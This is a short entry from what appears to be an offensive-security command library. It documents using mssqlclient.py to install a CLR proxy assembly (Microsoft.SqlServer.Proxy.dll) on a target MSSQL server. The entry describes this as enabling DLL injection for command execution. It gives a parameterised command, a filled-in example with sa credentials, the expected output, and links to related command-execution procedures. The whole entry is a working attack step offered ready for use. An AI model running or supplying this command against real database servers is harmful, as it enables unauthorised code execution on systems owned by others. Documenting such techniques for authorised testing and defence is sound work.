---
id: 27139325-b877-4d68-84a3-8c13e45e0a90
name: mssqlclient-install-proxy-dll
type: command
executor: bash
data: >-
  python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -install
  -clr Microsoft.SqlServer.Proxy.dll
output: null
created_at: '2023-04-06T03:56:20.471731+00:00'
updated_at: '2023-04-10T20:36:31.774363+00:00'
platforms:
  - Windows
tags:
  - installation
  - proxy
verified: true
validated: true
---

# mssqlclient-install-proxy-dll

## Command

```bash
python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -install -clr Microsoft.SqlServer.Proxy.dll
```

## Description

Installs the CLR proxy assembly on the target MSSQL instance using mssqlclient.py, enabling DLL injection for command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_HOST | SQL Server host (e.g., localhost) | Yes |
| $_USERNAME | SQL username (e.g., sa) | Yes |
| $_PASSWORD | SQL password | Yes |
| $_TARGET_IP | Target IP address | Yes |
| -install | Install mode flag | Yes |
| -clr | CLR assembly flag | Yes |
| Microsoft.SqlServer.Proxy.dll | Proxy DLL name | Yes |

## Examples

### Basic Usage

```bash
python3 mssqlclient.py 'localhost/sa:Password123@192.168.1.100' -install -clr Microsoft.SqlServer.Proxy.dll
```

### Advanced Usage

Use with verbose logging if available in the tool.

## Expected Output

CLR assembly 'Microsoft.SqlServer.Proxy.dll' installed successfully on the target instance.

## Related

- [[procedures/MSSQL-OLE-Automation-Command-Execution]]
- [[tools/mssqlproxy]]
